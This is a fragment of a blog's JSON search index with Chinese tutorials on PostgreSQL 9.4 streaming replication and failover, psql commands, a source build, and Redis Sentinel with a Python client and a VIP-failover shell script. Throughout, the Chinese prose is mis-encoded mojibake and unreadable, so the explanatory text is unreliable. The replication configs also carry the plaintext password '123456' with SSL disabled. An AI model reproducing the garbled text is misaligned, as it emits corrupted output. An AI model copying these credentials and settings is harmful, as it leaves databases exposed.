-Rï¼šåœ¨å¤‡ä»½ç»“æŸåè‡ªåŠ¨ç”Ÿæˆrecovery.confæ–‡ä»¶ 2.ä¿®æ”¹ä»åº“é…ç½® postgres.conf listen_addresses = 'localhost,10.0.0.73' # æŒ‡å®šæ¢å¤æœŸé—´æ˜¯å¦å¯ä»¥è¿æ¥å¹¶è¿è¡ŒæŸ¥è¯¢ hot_standby = on # è®¾ç½®å¤šé•¿æ—¶é—´å‘é€ä¸€æ¬¡ä»åº“çš„çŠ¶æ€ wal_receiver_status_interval = 10 # å‡å°‘ä»èŠ‚ç‚¹æ‰§è¡ŒæŸ¥è¯¢æ—¶å¤åˆ¶å†²çªçš„å¯èƒ½ hot_standby_feedback = on recovery.conf standby_mode = 'on' primary_conninfo = 'user=replica password=123456 host=10.0.0.72 port=5432 sslmode=disable sslcompression=1' recovery_target_timeline = 'latest' trigger_file = '/data/pgsql/trigger_file' 3.è®¾ç½®ç›®å½•æƒé™ chmod -R 0700 /data/pgsql/ 4.å¯åŠ¨æœåŠ¡ pg_ctl -D /data/pgsql -l /data/pgsql/pgsql.log start ","date":"2020-06-30 08:59","objectID":"/post/1859/:3:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"æŸ¥è¯¢åŒæ­¥çŠ¶æ€ \\x auto select * from pg_stat_replication; -[ RECORD 1 ]----+------------------------------ pid | 1693 usesysid | 16404 usename | replica application_name | walreceiver client_addr | 10.0.0.73 client_hostname | client_port | 33086 backend_start | 2020-06-29 22:51:27.448759-04 backend_xmin | 1913 state | streaming sent_location | 0/5017268 write_location | 0/5017268 flush_location | 0/5017268 replay_location | 0/5017268 sync_priority | 0 sync_state | async ","date":"2020-06-30 08:59","objectID":"/post/1859/:4:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"æµ‹è¯• ç™»é™†ä¸»åº“åˆ›å»ºæ•°æ®ï¼š create database test1; \\c test1; create table public.user(id SERIAL primary key, name varchar(32), age int); insert into \"user\" values(1,'soulchild',18); ç™»é™†ä»åº“æŸ¥è¯¢ï¼š \\l \\c test1 \\dt select name from public.user where id=1; name ----------- soulchild (1 row) ","date":"2020-06-30 08:59","objectID":"/post/1859/:5:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"æ¨¡æ‹ŸæœåŠ¡å™¨æ•…éšœ åœæ­¢ä¸»æœåŠ¡å™¨ pg_ctl stop -D /data/pgsql/ ä»åº“ä»ç„¶å¯æŸ¥è¯¢ï¼Œä½†ä¸èƒ½å†™ åˆ›å»ºtriggeræ–‡ä»¶,æå‡ä»æœåŠ¡å™¨ä¸ºä¸»ï¼š touch /data/pgsql/trigger_file ç°åœ¨ä»æœåŠ¡å™¨å°±å¯ä»¥è¯»å†™äº†ã€‚ åœ¨ä»æœåŠ¡å™¨æ’å…¥æ•°æ® \\c test insert into public.\"user\" values(2,'xiaolan',12); å¯åŠ¨10.0.0.72è¿™å°æœåŠ¡å™¨å¹¶è®¾ç½®ä¸ºä»æœåŠ¡å™¨ vim /data/pgsql/recovery.conf standby_mode = 'on' primary_conninfo = 'user=replica password=123456 host=10.0.0.73 port=5432 sslmode=disable sslcompression=1' recovery_target_timeline = 'latest' trigger_file = '/data/pgsql/trigger_file' å¯åŠ¨æ–°çš„ä»æœåŠ¡å™¨ pg_ctl -D /data/pgsql/ -l /data/pgsql/pgsql.log start æŸ¥è¯¢æ˜¯å¦å’Œæ–°çš„ä¸»æœåŠ¡å™¨åŒæ­¥äº†æ•°æ® \\c test select * from public.user; ","date":"2020-06-30 08:59","objectID":"/post/1859/:6:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"1.è¿æ¥æ•°æ®åº“ psql -Upostgres -h localhost -p 5432 -d postgres 2.å‘½ä»¤è¡Œæ‰§è¡Œsql psql -c '\\l' psql -c 'select current_time' psql -f my.sql 3.psqlå‘½ä»¤ \\duï¼šæŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ \\x: å¼€å¯æ‰©å±•æ˜¾ç¤ºï¼Œå†æ¬¡è¾“å…¥å…³é—­ã€‚ç±»ä¼¼mysql\\G \\gï¼šå°†æ‰§è¡Œç»“æœå‘é€åˆ°æ–‡ä»¶æˆ–ç®¡é“ select current_time;\\g a.txt gsetï¼šå°†æ‰§è¡Œç»“æœå‘é€åˆ°psqlå˜é‡ select current_time;\\gset my_time \\watchï¼šæ¯ç§’æ‰§è¡ŒæŸ¥è¯¢ \\watch select current_time; \\timingï¼šæ˜¾ç¤ºsqlæ‰§è¡Œæ—¶é—´ \\timing off or \\timing on \\setï¼šè®¾ç½®å˜é‡ \\set AUTOCOMMIT offï¼š å…³é—­è‡ªåŠ¨æäº¤äº‹ç‰© \\set a 1å¯ä»¥ä½¿ç”¨:aæ¥è°ƒç”¨ \\dt+ï¼šåˆ—å‡ºæ‰€æœ‰è¡¨ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šè§„åˆ™æ¥æŸ¥è¯¢ \\dt+ pg_*ï¼šåˆ—å‡ºpg_å¼€å¤´çš„è¡¨ \\d+ï¼šæŸ¥çœ‹æ‰€æœ‰è¡¨çš„å­—æ®µä¿¡æ¯ \\d+ testï¼šæŸ¥çœ‹testè¡¨çš„å­—æ®µä¿¡æ¯ \\lï¼šæŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ \\cï¼šåˆ‡æ¢æ•°æ®åº“ \\diï¼šæŸ¥çœ‹ç´¢å¼• \\dsï¼šæŸ¥çœ‹åºåˆ— \\dnsï¼šæŸ¥çœ‹schema \\copyï¼šå°†è¡¨çš„æ•°æ®å†™åˆ°æ–‡ä»¶ï¼Œæˆ–è€…ä»æ–‡ä»¶è¯»å–æ•°æ®å†™åˆ°è¡¨ä¸­ \\copy test to ./test.txtï¼šå°†testè¡¨æ‰€æœ‰æ•°æ®å†™åˆ°æ–‡ä»¶ä¸­ \\copy (select id from test) to ./test_id.txtï¼šå°†queryè¯­å¥æŸ¥è¯¢çš„å†…å®¹å†™åˆ°æ–‡ä»¶ 4.å¸¸ç”¨sql åˆ›å»ºæ•°æ®åº“ï¼š create database test; åˆ›å»ºschemaï¼š create schema test_schema; åˆ›å»ºè¡¨ï¼š create table test_schema.test1(id int,name varchar(64), unique(id)); è®¾ç½®é»˜è®¤æŸ¥è¯¢è·¯å¾„ï¼š set search_path to test_schema; åˆ›å»ºåºåˆ—ï¼š create sequence test_seq; åˆ›å»ºç”¨æˆ·ï¼š create user \u003cusername\u003e with \u003cæƒé™ CREATEDB LOGIN\u003e password '\u003cpassword\u003e'; ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼š alter user \u003cusername\u003e with password '\u003cpassword\u003e'; åˆ é™¤ç”¨æˆ·ï¼š drop user \u003cusername\u003e; æŸ¥è¯¢ç”¨æˆ·ï¼š select * from pg_user; select * from pg_authid; select * from pg_roles; ","date":"2020-06-29 11:22","objectID":"/post/1853/:0:0","tags":["postgresql","pgsql"],"title":"psqlåŸºæœ¬å‘½ä»¤å’Œå¸¸ç”¨sql","uri":"/post/1853/"},{"categories":["databases"],"content":"å®‰è£…ï¼š yum install -y gcc readline-devel zlib-devel wget http://ftp.postgresql.org/pub/source/v9.4.25/postgresql-9.4.25.tar.gz tar xf postgresql-9.4.25.tar.gz cd postgresql-9.4.25/ ./configure --prefix=/usr/local/pgsql make make install mkdir /data/pgsql -p useradd postgres chown -R postgres:postgres /usr/local/pgsql /data/pgsql su postgres /usr/local/pgsql/bin/initdb -D /data/pgsql/ /usr/local/pgsql/bin/pg_ctl -D /data/pgsql/ -l /usr/local/pgsql/pgsql.log start é…ç½®ç¯å¢ƒå˜é‡æ–¹ä¾¿ä½¿ç”¨ vim /etc/profile export PGSQL_HOME=/usr/local/pgsql export PATH=$PATH:$PGSQL_HOME/bin #ä½¿é…ç½®ç”Ÿæ•ˆ source /etc/profile systemdå¯åŠ¨ [Unit] Description=PostgreSQL 9.4 database server Documentation=https://www.postgresql.org/docs/9.4/static/ After=syslog.target After=network.target [Service] Type=forking User=postgres Group=postgres # Note: avoid inserting whitespace in these Environment= lines, or you may # break postgresql-setup. # Location of database directory Environment=PGDATA=/data/postgresql/ # Where to send early-startup messages from the server (before the logging # options of postgresql.conf take effect) # This is normally controlled by the global default set by systemd # StandardOutput=syslog # Disable OOM kill on the postmaster OOMScoreAdjust=-1000 ExecStart=/application/pgsql/bin/pg_ctl start -D ${PGDATA} -s -w -t 300 ExecStop=/application/pgsql/bin/pg_ctl stop -D ${PGDATA} -s -m fast ExecReload=/application/pgsql/bin/pg_ctl reload -D ${PGDATA} -s # Do not set any timeout value, so that systemd will not kill postmaster # during crash recovery. TimeoutSec=0 [Install] WantedBy=multi-user.target ","date":"2020-06-29 10:33","objectID":"/post/1852/:0:0","tags":["postgresql","pgsql"],"title":"pgsql9.4.25æºç å®‰è£…","uri":"/post/1852/"},{"categories":["python","databases"],"content":" # -*- coding: utf-8 -*- import redis from redis.sentinel import Sentinel # è¿æ¥å“¨å…µæœåŠ¡å™¨(ä¸»æœºåä¹Ÿå¯ä»¥ç”¨åŸŸå) sentinel = Sentinel([('10.0.0.30', 26379), ('10.0.0.30', 26379), ('10.0.0.30', 26379), ], socket_timeout=0.5) # è·å–ä¸»æœåŠ¡å™¨åœ°å€ master = sentinel.discover_master('mymaster') print('ä¸»æœåŠ¡å™¨åœ°å€:', master) # è·å–ä»æœåŠ¡å™¨åœ°å€ slave = sentinel.discover_slaves('mymaster') print('ä»æœåŠ¡å™¨åœ°å€:', slave) # è·å–ä¸»æœåŠ¡å™¨è¿æ¥å®ä¾‹ master = sentinel.master_for('mymaster', socket_timeout=0.5, db=15) print('ä¸»æœåŠ¡å™¨è¿æ¥å®ä¾‹ï¼š', master) # è·å–ä»æœåŠ¡å™¨è¿›è¡Œè¯»å–ï¼ˆé»˜è®¤æ˜¯round-roubinï¼‰ slave = sentinel.slave_for('mymaster', socket_timeout=0.5, db=15) def test(i): input(\"ä»»æ„é”®ç»§ç»­...\") w_ret = master.set('foo', i) print('setç»“æœ:', w_ret) r_ret = slave.get('foo') print('getç»“æœ:',r_ret.decode()) for i in range(1,100): test(i) ","date":"2020-06-28 16:38","objectID":"/post/1850/:0:0","tags":["redis","python"],"title":"pythonæ“ä½œredis-sentinel","uri":"/post/1850/"},{"categories":["databases"],"content":"ä¸‰ä¸ªå“¨å…µé…ç½®å¦‚ä¸‹ port 26379 daemonize yes pidfile \"/var/run/redis-sentinel.pid\" logfile \"/var/log/redis/redis-sentinel.log\" sentinel monitor mymaster 10.0.0.30 6379 2 sentinel down-after-milliseconds mymaster 5000 sentinel failover-timeout mymaster 20000 sentinel parallel-syncs mymaster 1 sentinel client-reconfig-script mymaster /server/scripts/redis_sentinel.sh ","date":"2020-06-28 13:17","objectID":"/post/1849/:1:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼vip","uri":"/post/1849/"},{"categories":["databases"],"content":"IPæ¼‚ç§»è„šæœ¬ æ¯ä¸ªsentinelèŠ‚ç‚¹éƒ½éœ€è¦æ·»åŠ  vim /server/scripts/redis_sentinel.sh #!/bin/bash MASTER_IP=${6} VIP='10.0.0.25' NETMASK='24' INTERFACE='eth0' MY_IP=`ip a s dev ${INTERFACE} | awk 'NR==3{split($2,ip,\"/\");print ip[1]}'` if [ ${MASTER_IP} = ${MY_IP} ]; then /sbin/ip addr add ${VIP}/${NETMASK} dev ${INTERFACE} /sbin/arping -q -c 3 -A ${VIP} -I ${INTERFACE} exit 0 else /sbin/ip addr del ${VIP}/${NETMASK} dev ${INTERFACE} exit 0 fi exit 1 redis-sentinelä¼šå‘è„šæœ¬ä¼ å‚mymaster observer start æ—§ä¸»ip 6379 æ–°ä¸»ip 6379 æ·»åŠ æ‰§è¡Œæƒé™ chmod +x /server/scripts/redis_sentinel.sh ","date":"2020-06-28 13:17","objectID":"/post/1849/:2:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼vip","uri":"/post/1849/"},{"categories":["databases"],"content":"æ‰‹åŠ¨æ·»åŠ VIP ä¸»èŠ‚ç‚¹æ‰§è¡Œï¼š ip addr add 10.0.0.25/24 dev eth0 ","date":"2020-06-28 13:17","objectID":"/post/1849/:3:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼vip","uri":"/post/1849/"},{"categories":["databases"],"content":"æµ‹è¯• åœæ­¢ä¸»èŠ‚ç‚¹ redis-cli shutdown æŸ¥çœ‹å“¨å…µæ—¥å¿—,ä¸»èŠ‚ç‚¹å·²ç»åˆ‡åˆ°10.0.0.31äº† tail /var/log/redis/redis-sentinel.log 3723:X 28 Jun 2020 03:51:28.289 # +switch-master mymaster 10.0.0.30 6379 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:28.290 * +slave slave 10.0.0.32:6379 10.0.0.32 6379 @ mymaster 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:28.290 * +slave slave 10.0.0.30:6379 10.0.0.30 6379 @ mymaster 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:33.297 # +sdown slave 10.0.0.30:6379 10.0.0.30 6379 @ mymaster 10.0.0.31 6379 æ£€æŸ¥æ—§ä¸»èŠ‚ç‚¹vipæ˜¯å¦åˆ é™¤ æ£€æŸ¥æ–°ä¸»èŠ‚ç‚¹vipæ˜¯å¦æ·»åŠ  ip a ","date":"2020-06-28 13:17","objectID":"/post/1849/:4:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼vip","uri":"/post/1849/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.å®‰è£…redis yum install -y gcc-c++ cd /server/packages wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz cd redis-5.0.5 make make install ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:1","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2.æ•´åˆredis mkdir /usr/local/redis/{etc,bin,log} -p cp redis.conf sentinel.conf /usr/local/redis/etc/ cd src cp mkreleasehdr.sh redis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server redis-trib.rb /usr/local/redis/bin/ æ•´åˆåå¯ä»¥å¤ç”¨ï¼Œåˆ†å‘åˆ°å…¶ä»–èŠ‚ç‚¹ ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:2","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3.é…ç½®ç¯å¢ƒå˜é‡ echo 'export PATH=$PATH:/usr/local/redis/bin' \u003e\u003e /etc/profile source /etc/profile ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:3","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4.è°ƒä¼˜ echo -e 'vm.overcommit_memory=1\\nnet.core.somaxconn=2048' \u003e\u003e /etc/sysctl.conf # é‡æ–°åŠ è½½é…ç½® sysctl -p ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:4","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"5.ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /usr/local/redis/etc/redis.conf bind 0.0.0.0 protected-mode yes port 6379 tcp-backlog 2048 timeout 0 tcp-keepalive 300 daemonize yes supervised systemd pidfile \"/var/run/redis_6379.pid\" loglevel notice logfile \"/usr/local/redis/log/access.log\" databases 16 always-show-logo yes save 900 1 save 300 10 save 60 10000 stop-writes-on-bgsave-error yes rdbcompression yes rdbchecksum yes dbfilename \"dump.rdb\" dir \"/usr/local/redis\" replica-serve-stale-data yes replica-read-only yes repl-diskless-sync no repl-diskless-sync-delay 5 repl-disable-tcp-nodelay no replica-priority 100 lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no appendonly no appendfilename \"appendonly.aof\" appendfsync everysec no-appendfsync-on-rewrite no auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb aof-load-truncated yes aof-use-rdb-preamble yes lua-time-limit 5000 slowlog-log-slower-than 10000 slowlog-max-len 128 latency-monitor-threshold 0 notify-keyspace-events \"\" hash-max-ziplist-entries 512 hash-max-ziplist-value 64 list-max-ziplist-size -2 list-compress-depth 0 set-max-intset-entries 512 zset-max-ziplist-entries 128 zset-max-ziplist-value 64 hll-sparse-max-bytes 3000 stream-node-max-bytes 4096 stream-node-max-entries 100 activerehashing yes client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 hz 10 dynamic-hz yes aof-rewrite-incremental-fsync yes rdb-save-incremental-fsync yes maxclients 4064 å¦‚æœæ˜¯ä»èŠ‚ç‚¹ï¼Œéœ€è¦æŒ‡å‘ä¸»èŠ‚ç‚¹ï¼Œæ·»åŠ ç±»ä¼¼å¦‚ä¸‹é…ç½®é¡¹ slaveof 172.17.10.161 6379 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:5","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"6.é…ç½®sentinel vim /usr/local/redis/etc/sentinel.conf daemonize yes port 26379 logfile /var/log/redis/redis-sentinel.log pidfile /var/run/redis-sentinel.pid sentinel monitor elk 172.17.10.161 6379 2 sentinel down-after-milliseconds elk 3000 sentinel failover-timeout elk 20000 sentinel parallel-syncs elk 1 sentinel client-reconfig-script elk /server/scripts/redis_sentinel.sh ä¸‰ä¸ªèŠ‚ç‚¹åŒæ ·çš„é…ç½® ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:6","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"7.åˆ›å»ºå¯åŠ¨ç”¨æˆ· useradd -r redis \u0026\u0026 chown -R redis.redis /usr/local/redis/ ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:7","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"8.é…ç½®systemdè„šæœ¬ redis-server vim /etc/systemd/system/redis.service [Unit] Description=Redis persistent key-value database After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf --supervised systemd Type=notify User=redis Group=redis [Install] WantedBy=multi-user.target redis-sentinel vim /etc/systemd/system/redis-sentinel.service [Unit] Description=Redis Sentinel After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.conf --supervised systemd Type=notify #User=redis #Group=redis [Install] WantedBy=multi-user.target ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:8","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"9.é…ç½®VIPæ¼‚ç§»è„šæœ¬ æ¯ä¸ªsentinelèŠ‚ç‚¹éƒ½éœ€è¦æ·»åŠ å¦‚ä¸‹è„šæœ¬ vim /server/scripts/redis_sentinel.sh #!/bin/bash MASTER_IP=${6} VIP='172.17.10.164' NETMASK='24' INTERFACE='eth0' MY_IP=`ip a s dev ${INTERFACE} | awk 'NR==3{split($2,ip,\"/\");print ip[1]}'` if [ ${MASTER_IP} = ${MY_IP} ]; then /sbin/ip addr add ${VIP}/${NETMASK} dev ${INTERFACE} /sbin/arping -q -c 3 -A ${VIP} -I ${INTERFACE} exit 0 else /sbin/ip addr del ${VIP}/${NETMASK} dev ${INTERFACE} exit 0 fi exit 1 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:9","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"10.å¯åŠ¨æœåŠ¡ systemctl start redis systemctl enable redis systemctl start redis-sentinel systemctl enable redis-sentinel ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:10","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼+vipé…ç½®","uri":"/post/2425/"},{"categories":["databases"],"content":"Redis çš„ Sentinel ç³»ç»Ÿç”¨äºç®¡ç†å¤šä¸ª Redis æœåŠ¡å™¨ï¼ˆinstanceï¼‰ï¼Œ è¯¥ç³»ç»Ÿæ‰§è¡Œä»¥ä¸‹ä¸‰ä¸ªä»»åŠ¡ï¼š ç›‘æ§ï¼ˆMonitoringï¼‰ï¼š Sentinel ä¼šä¸æ–­åœ°æ£€æŸ¥ä½ çš„ä¸»æœåŠ¡å™¨å’Œä»æœåŠ¡å™¨æ˜¯å¦è¿ä½œæ­£å¸¸ã€‚ æé†’ï¼ˆNotificationï¼‰ï¼š å½“è¢«ç›‘æ§çš„æŸä¸ª Redis æœåŠ¡å™¨å‡ºç°é—®é¢˜æ—¶ï¼Œ Sentinel å¯ä»¥é€šè¿‡ API å‘ç®¡ç†å‘˜æˆ–è€…å…¶ä»–åº”ç”¨ç¨‹åºå‘é€é€šçŸ¥ã€‚ è‡ªåŠ¨æ•…éšœè¿ç§»ï¼ˆAutomatic failoverï¼‰ï¼š å½“ä¸€ä¸ªä¸»æœåŠ¡å™¨ä¸èƒ½æ­£å¸¸å·¥ä½œæ—¶ï¼Œ Sentinel ä¼šå¼€å§‹ä¸€æ¬¡è‡ªåŠ¨æ•…éšœè¿ç§»æ“ä½œï¼Œ å®ƒä¼šå°†å¤±æ•ˆä¸»æœåŠ¡å™¨çš„å…¶ä¸­ä¸€ä¸ªä»æœåŠ¡å™¨å‡çº§ä¸ºæ–°çš„ä¸»æœåŠ¡å™¨ï¼Œ å¹¶è®©å¤±æ•ˆä¸»æœåŠ¡å™¨çš„å…¶ä»–ä»æœåŠ¡å™¨æ”¹ä¸ºå¤åˆ¶æ–°çš„ä¸»æœåŠ¡å™¨ï¼› å½“å®¢æˆ·ç«¯è¯•å›¾è¿æ¥å¤±æ•ˆçš„ä¸»æœåŠ¡å™¨æ—¶ï¼Œ é›†ç¾¤ä¹Ÿä¼šå‘å®¢æˆ·ç«¯è¿”å›æ–°ä¸»æœåŠ¡å™¨çš„åœ°å€ï¼Œ ä½¿å¾—é›†ç¾¤å¯ä»¥ä½¿ç”¨æ–°ä¸»æœåŠ¡å™¨ä»£æ›¿å¤±æ•ˆæœåŠ¡å™¨ã€‚ ","date":"2020-06-24 17:07","objectID":"/post/1847/:0:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"ç¯å¢ƒå‡†å¤‡ï¼š redis-serverï¼š 10.0.0.30:6379 ä¸» 10.0.0.30:6389 ä» 10.0.0.31:6379 ä» 10.0.0.31:6380 ä» redis-sentinelï¼š 10.0.0.30:26379 10.0.0.30:26380 10.0.0.31:26379 ","date":"2020-06-24 17:07","objectID":"/post/1847/:1:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"é…ç½®redisä¸»ä» å‚è€ƒé“¾æ¥ ","date":"2020-06-24 17:07","objectID":"/post/1847/:2:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"é…ç½®sentinel sentinelé…ç½®æ–‡ä»¶: daemonize yes port 26379 logfile /var/log/redis/redis-sentinel.log pidfile /var/run/redis-sentinel.pid sentinel monitor mymaster 10.0.0.30 6379 2 sentinel down-after-milliseconds mymaster 5000 sentinel failover-timeout mymaster 20000 sentinel parallel-syncs mymaster 1 ","date":"2020-06-24 17:07","objectID":"/post/1847/:3:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"é…ç½®è¯´æ˜ï¼š sentinel monitor mymaster 10.0.0.30 6379 2: é…ç½®Sentinelå»ç›‘è§†ä¸€ä¸ªåä¸ºmymasterçš„ä¸»æœåŠ¡å™¨ï¼Œ è¿™ä¸ªä¸»redisçš„IPåœ°å€ä¸º10.0.0.30ï¼Œç«¯å£å·ä¸º 6379ï¼Œè€Œå°†è¿™ä¸ªä¸»redisåˆ¤æ–­ä¸ºå¤±æ•ˆè‡³å°‘éœ€è¦2ä¸ªSentinelåŒæ„ï¼ˆåªè¦åŒæ„Sentinelçš„æ•°é‡ä¸è¾¾æ ‡ï¼Œè‡ªåŠ¨æ•…éšœè¿ç§»å°±ä¸ä¼šæ‰§è¡Œï¼‰ã€‚ ä¸è¿‡è¦æ³¨æ„ï¼Œ æ— è®ºä½ è®¾ç½®è¦å¤šå°‘ä¸ªSentinelåŒæ„æ‰èƒ½åˆ¤æ–­ä¸€ä¸ªæœåŠ¡å™¨å¤±æ•ˆï¼ŒSentinel éƒ½éœ€è¦è·å¾—ç³»ç»Ÿä¸­å¤šæ•°Sentinelçš„æ”¯æŒï¼Œæ‰èƒ½å‘èµ·ä¸€æ¬¡è‡ªåŠ¨æ•…éšœè¿ç§» sentinel down-after-milliseconds mymaster 5000: æŒ‡å®šäº†Sentinelè®¤ä¸ºæœåŠ¡å™¨å·²ç»æ–­çº¿æ‰€éœ€çš„æ¯«ç§’æ•°ã€‚ å¦‚æœæœåŠ¡å™¨åœ¨ç»™å®šçš„æ¯«ç§’æ•°ä¹‹å†…ï¼Œ æ²¡æœ‰è¿”å›Sentinelå‘é€çš„PINGå‘½ä»¤çš„å›å¤ï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆ Sentinelå°†è¿™ä¸ªæœåŠ¡å™¨æ ‡è®°ä¸ºä¸»è§‚ä¸‹çº¿(subjectively down,ç®€ç§°SDOWN)ã€‚ ä¸è¿‡åªæœ‰ä¸€ä¸ªSentinelå°†æœåŠ¡å™¨æ ‡è®°ä¸ºä¸»è§‚ä¸‹çº¿å¹¶ä¸ä¸€å®šä¼šå¼•èµ·æœåŠ¡å™¨çš„è‡ªåŠ¨æ•…éšœè¿ç§»ï¼šåªæœ‰åœ¨è¶³å¤Ÿæ•°é‡çš„Sentineléƒ½å°†ä¸€ä¸ªæœåŠ¡å™¨æ ‡è®°ä¸ºä¸»è§‚ä¸‹çº¿ä¹‹åï¼ŒæœåŠ¡å™¨æ‰ä¼šè¢«æ ‡è®°ä¸ºå®¢è§‚ä¸‹çº¿ï¼ˆobjectively downï¼Œ ç®€ç§°ODOWNï¼‰ï¼Œè¿™æ—¶è‡ªåŠ¨æ•…éšœè¿ç§»æ‰ä¼šæ‰§è¡Œã€‚ sentinel failover-timeout mymaster 15000: æ•…éšœè¿ç§»çš„è¶…æ—¶æ—¶é—´ sentinel parallel-syncs mymaster 1ï¼šé€‰é¡¹æŒ‡å®šäº†åœ¨æ‰§è¡Œæ•…éšœè½¬ç§»æ—¶ï¼Œ æœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªä»æœåŠ¡å™¨åŒæ—¶å¯¹æ–°çš„ä¸»æœåŠ¡å™¨è¿›è¡ŒåŒæ­¥ï¼Œ è¿™ä¸ªæ•°å­—è¶Šå°ï¼Œ å®Œæˆæ•…éšœè½¬ç§»æ‰€éœ€çš„æ—¶é—´å°±è¶Šé•¿ã€‚ å¦‚æœä»æœåŠ¡å™¨è¢«è®¾ç½®ä¸ºå…è®¸ä½¿ç”¨è¿‡æœŸæ•°æ®é›†ï¼ˆå‚è§å¯¹ redis.conf æ–‡ä»¶ä¸­å¯¹ slave-serve-stale-data é€‰é¡¹çš„è¯´æ˜ï¼‰ï¼Œ é‚£ä¹ˆä½ å¯èƒ½ä¸å¸Œæœ›æ‰€æœ‰ä»æœåŠ¡å™¨éƒ½åœ¨åŒä¸€æ—¶é—´å‘æ–°çš„ä¸»æœåŠ¡å™¨å‘é€åŒæ­¥è¯·æ±‚ï¼Œ å› ä¸ºå°½ç®¡å¤åˆ¶è¿‡ç¨‹çš„ç»å¤§éƒ¨åˆ†æ­¥éª¤éƒ½ä¸ä¼šé˜»å¡ä»æœåŠ¡å™¨ï¼Œ ä½†ä»æœåŠ¡å™¨åœ¨è½½å…¥ä¸»æœåŠ¡å™¨å‘æ¥çš„ RDB æ–‡ä»¶æ—¶ï¼Œ ä»ç„¶ä¼šé€ æˆä»æœåŠ¡å™¨åœ¨ä¸€æ®µæ—¶é—´å†…ä¸èƒ½å¤„ç†å‘½ä»¤è¯·æ±‚ï¼š å¦‚æœå…¨éƒ¨ä»æœåŠ¡å™¨ä¸€èµ·å¯¹æ–°çš„ä¸»æœåŠ¡å™¨è¿›è¡ŒåŒæ­¥ï¼Œ é‚£ä¹ˆå°±å¯èƒ½ä¼šé€ æˆæ‰€æœ‰ä»æœåŠ¡å™¨åœ¨çŸ­æ—¶é—´å†…å…¨éƒ¨ä¸å¯ç”¨çš„æƒ…å†µå‡ºç°ã€‚ ä½ å¯ä»¥é€šè¿‡å°†è¿™ä¸ªå€¼è®¾ä¸º 1 